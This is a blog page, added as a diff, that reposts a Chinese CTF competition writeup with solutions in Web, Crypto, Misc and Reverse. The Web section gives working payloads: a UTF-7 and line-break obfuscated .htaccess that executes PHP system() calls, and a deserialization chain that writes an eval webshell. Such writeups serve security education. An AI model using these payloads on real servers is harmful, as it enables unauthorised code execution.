@@ -1,0 +1,400 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="M1mikatz版同题合集,完整payload:#define width 1337+UTF-7+加换行+反序列化成员数绕+MT19937逆推+DSA r1&#x3D;r2+蚁剑流量+RGB二维码+ezxor+arbitrary">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%94%B5%E5%AD%90%E8%AE%BE%E8%AE%A1%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B_writeup_by_M1mikatz/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="M1mikatz版同题合集,完整payload:#define width 1337+UTF-7+加换行+反序列化成员数绕+MT19937逆推+DSA r1&#x3D;r2+蚁剑流量+RGB二维码+ezxor+arbitrary">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="Web-upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%94%B5%E5%AD%90%E8%AE%BE%E8%AE%A1%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B_writeup_by_M1mikatz/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/87116.html">https://www.ctfiot.com/87116.html</a><br>ID: 87116</p>
+</blockquote>
+<p>第六届山东省大学生电子设计大赛 </p>
+<p>网络安全技能竞赛 </p>
+<p>writeup by M1mikatz</p>
+<p>为深入贯彻落实科教强鲁人才兴鲁战略，服务人才培养和创新省份建设，围绕中央网信办、教育部印发的《一流网络安全学院建设示范项目管理办法》加快高等院校网络安全及相关学科建设和人才培养，逐步建成全省网络安全产业人才聚集高地,举办第六届山东省大学生电子设计大赛——网络安全技能竞赛。在本次竞赛中，网安社的三支代表队分别获得了第一名，第三名，第七名的优异成绩。</p>
+<p>Web</p>
+<p>upload_100</p>
+<p>一个文件上传，只能上传 .htaccess：<br>并且对文件内容进行过滤。并且upload目录下面没有php文件，因此考虑将 .htaccess 解析为 php文件使用。</p>
+<p>注意，题目似乎对上传文件的尺寸做了限制，需要在 .htaccess 开头定义好大小。别问为什么，试出来的。。。。。。</p>
+<p>#define width 1337<br>#define height 1337</p>
+<p>需要先在 .htaccess 里面设置允许访问 .htaccess 文件，否则是直接访问 .htaccess 文件是Forbidden的：</p>
+<p>&lt;Files ~ “^.ht”&gt;<br> Require all granted<br> Order allow,deny<br> Allow from all<br></Files></p>
+<p>然后再设置将 .htaccess 指定当做 PHP 文件处理并解析：</p>
+<p>SetHandler application&#x2F;x-httpd-php<br># <?=system($_POST[whoami]);?></p>
+<p>最终 .htaccess 文件里面的内容为：</p>
+<p>&lt;Files ~ “^.ht”&gt;<br> Require all granted<br> Order allow,deny<br> Allow from all<br></Files><br>SetHandler application&#x2F;x-httpd-php<br># <?=system($_POST[whoami]);?></p>
+<p>但是文件内容过滤了很多关键字，并且 &lt;?&#x3D; 也被过滤了，我们可以使用  UTF-7 编码绕过，即：</p>
+<p>&lt;Files ~ “^.ht”&gt;<br> Require all granted<br> Order allow,deny<br> Allow from all<br></Files><br>SetHandler application&#x2F;x-httpd-php<br>php_flag zend.multibyte 1<br>php_value zend.script_encoding “UTF-7”<br># +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4</p>
+<p>然后使用 加换行绕过其他的关键字，最终的payload如下：</p>
+<p>#define width 1337<br>#define height 1337<br>&lt;Fi<br>les ~ “^.ht”&gt;<br> Require all granted<br> Order allow,deny<br> Allow from all<br>&lt;&#x2F;Fi<br>les&gt;<br>SetHa<br>ndler applic<br>ation&#x2F;x-h<br>ttpd-p<br>hp<br>ph<br>p_flag zend.multibyte 1<br>ph<br>p_val<br>ue zend.script_encoding “UTF-7”<br># +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4</p>
+<p>然后我们直接访问 .htaccess 文件即可把 .htaccess 文件当做 PHP 文件处理并执行里面的 PHP 代码：<br>pop_200</p>
+<p>很简单一反序列化，php 5 的环境，直接用成员数绕过 __wakeup，然后写webshell即可：</p>
+<?php
+error_reporting(0);
+
+class File_operations {
+    protected $filename='/var/www/html/shell.php';
+}
+
+class Show_index {
+    public $filepage;
+}
+
+class Exception_process {
+    public $arg;
+}
+
+class Transfer  {
+    public $method;
+    private $parameter = "<?php eval($_POST[a]);";
+}
+
+$poc = new Show_index();
+$poc->filepage = new Transfer();
+$poc->filepage->method = new Transfer();
+$poc->filepage->method->method = new File_operations();
+echo urlencode(serialize($poc));
+
+Crypto
+
+签到
+然后维吉尼亚解密
+
+在凯撒
+
+第二轮签到题
+
+三层base
+
+mt
+
+mt19937的预测，照着逻辑给逆回去就行
+
+https://blog.csdn.net/shshss64/article/details/127326357
+
+from Crypto.Util.number import *
+import gmpy2
+import hashlib
+ 
+# right shift inverse
+def inverse_right(res, shift):
+    tmp = res
+    bits = len(bin(res)[2:])
+    for i in range(bits // shift):
+        tmp = res ^ tmp >> shift
+    return tmp
+ 
+ 
+# right shift with mask inverse
+def inverse_right_mask(res, shift, mask):
+    tmp = res
+    bits = len(bin(res)[2:])
+    for i in range(bits // shift):
+        tmp = res ^ tmp >> shift & mask
+    return tmp
+ 
+# left shift inverse
+def inverse_left(res, shift):
+    tmp = res
+    bits = len(bin(res)[2:])
+    for i in range(bits // shift):
+        tmp = res ^ tmp << shift
+    return tmp
+ 
+ 
+# left shift with mask inverse
+def inverse_left_mask(res, shift, mask):
+    tmp = res
+    bits = len(bin(res)[2:])
+    for i in range(bits // shift):
+        tmp = res ^ tmp << shift & mask
+    return tmp
+ 
+ 
+def enc(y):
+    y = y ^ y >> 11
+    y = y ^ y << 7 & 2636928640
+    y = y ^ y << 15 & 4022730752
+    y = y ^ y >> 18
+    return y&0xffffffff
+ 
+def recover(y):
+    y = inverse_right(y,18)
+    y = inverse_left_mask(y,15,4022730752)
+    y = inverse_left_mask(y,7,2636928640)
+    y = inverse_right(y,11)
+    return y
+ 
+ 
+def rrecover(last):
+ n = 1<<32
+ inv = gmpy2.invert(1812433253,n)
+ for i in range(99,0,-1):
+  last = ((last-i)*inv)%n
+  last = inverse_right(last,30)
+ return last
+ 
+c = 1047573452
+tmp = recover(c)
+flag = rrecover(tmp)
+print(flag)
+print('flag{'+hashlib.md5(str(flag).encode()).hexdigest()+'}')
+
+easy
+
+dsa加密，注意到r1和r2其实相同，先行把flag约去求得k后，再反代求出flag
+
+from Crypto.Util.number import *
+import gmpy2
+import hashlib
+h1,h2,s1,s2,r1,q = [818128692003030167977053277109430684611703076399,486498008062394064249282337122659834542436448201,247121551505513420409531383106944282908920522414,754913008212620944684250081707312932655139381276,1309822693949102705754289540573759976438632888627,1328243644040291196447577554903037460035141284781]
+r2 = r1
+k = (h1 * r2 - h2 * r1) * gmpy2.invert(s1 * r2 - s2 * r1,q) % q
+flag = (k * s1 - h1) * gmpy2.invert(r1,q) % q
+print(flag)
+print(long_to_bytes(flag))
+print('flag{' + hashlib.md5(str(flag).encode()).hexdigest() + '}')
+
+Misc
+
+hacker
+
+按照协议排序，找到http流
+发现是蚁剑流量，挨个解
+
+找到密码：
+
+在第147流里找到zip
+
+提出来解压得到flag
+
+image-20221221124122246
+
+Draw
+
+255和0那些rgb值分别转01，用记事本就行
+然后画二维码
+
+from PIL import Image
+MAX = 400
+pic = Image.new("RGB",(MAX, MAX))
+str = '000000000000000000000000000.....................0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
+i=0
+for y in range (0,MAX):
+    for x in range (0,MAX):
+        if(str[i] == '1'):
+            pic.putpixel([x,y],(0, 0, 0))
+        else:
+            pic.putpixel([x,y],(255,255,255))
+        i = i+1
+pic.show()
+pic.save("11.png")
+
+然后扫二维码
+
+Re
+
+ezxor
+
+转dec
+输入38个a，动态调试与随机数异或之后得到x，在和y异或
+
+y = [169,178,231,186,187,120,180,187,152,171,222,58,165,156,215,149,93,219,31,160,26,50,88,254,197,99,197,46,79,38,26,65,91,191,128,141,138,189]
+x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]
+flag = ''
+for i in range(38):
+ flag += chr(x[i]^y[i]^ord('a'))
+print(flag)
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">    #define width 1337</span><br><span class="line">    #define height 1337</span><br><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># &lt;?=system($_POST[whoami]);?&gt;</span><br><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># &lt;?=system($_POST[whoami]);?&gt;</span><br><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4</span><br><span class="line">    #define width 1337</span><br><span class="line">    #define height 1337</span><br><span class="line">&lt;Fi</span><br><span class="line">les ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Fi</span><br><span class="line">les&gt;</span><br><span class="line">SetHa</span><br><span class="line">ndler applic</span><br><span class="line">ation/x-h</span><br><span class="line">ttpd-p</span><br><span class="line">hp</span><br><span class="line">ph</span><br><span class="line">p_flag zend.multibyte 1</span><br><span class="line">ph</span><br><span class="line">p_val</span><br><span class="line">ue zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class File_operations &#123;</span><br><span class="line">    protected $filename=&#x27;/var/www/html/shell.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show_index &#123;</span><br><span class="line">    public $filepage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Exception_process &#123;</span><br><span class="line">    public $arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Transfer  &#123;</span><br><span class="line">    public $method;</span><br><span class="line">    private $parameter = &quot;&lt;?php eval($_POST[a]);&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$poc = new Show_index();</span><br><span class="line">$poc-&gt;filepage = new Transfer();</span><br><span class="line">$poc-&gt;filepage-&gt;method = new Transfer();</span><br><span class="line">$poc-&gt;filepage-&gt;method-&gt;method = new File_operations();</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import hashlib</span><br><span class="line"> </span><br><span class="line"># right shift inverse</span><br><span class="line">def inverse_right(res, shift):</span><br><span class="line">    tmp = res</span><br><span class="line">    bits = len(bin(res)[2:])</span><br><span class="line">    for i in range(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    return tmp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># right shift with mask inverse</span><br><span class="line">def inverse_right_mask(res, shift, mask):</span><br><span class="line">    tmp = res</span><br><span class="line">    bits = len(bin(res)[2:])</span><br><span class="line">    for i in range(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">    return tmp</span><br><span class="line"> </span><br><span class="line"># left shift inverse</span><br><span class="line">def inverse_left(res, shift):</span><br><span class="line">    tmp = res</span><br><span class="line">    bits = len(bin(res)[2:])</span><br><span class="line">    for i in range(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    return tmp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># left shift with mask inverse</span><br><span class="line">def inverse_left_mask(res, shift, mask):</span><br><span class="line">    tmp = res</span><br><span class="line">    bits = len(bin(res)[2:])</span><br><span class="line">    for i in range(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    return tmp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def enc(y):</span><br><span class="line">    y = y ^ y &gt;&gt; 11</span><br><span class="line">    y = y ^ y &lt;&lt; 7 &amp; 2636928640</span><br><span class="line">    y = y ^ y &lt;&lt; 15 &amp; 4022730752</span><br><span class="line">    y = y ^ y &gt;&gt; 18</span><br><span class="line">    return y&amp;0xffffffff</span><br><span class="line"> </span><br><span class="line">def recover(y):</span><br><span class="line">    y = inverse_right(y,18)</span><br><span class="line">    y = inverse_left_mask(y,15,4022730752)</span><br><span class="line">    y = inverse_left_mask(y,7,2636928640)</span><br><span class="line">    y = inverse_right(y,11)</span><br><span class="line">    return y</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def rrecover(last):</span><br><span class="line"> n = 1&lt;&lt;32</span><br><span class="line"> inv = gmpy2.invert(1812433253,n)</span><br><span class="line"> for i in range(99,0,-1):</span><br><span class="line">  last = ((last-i)*inv)%n</span><br><span class="line">  last = inverse_right(last,30)</span><br><span class="line"> return 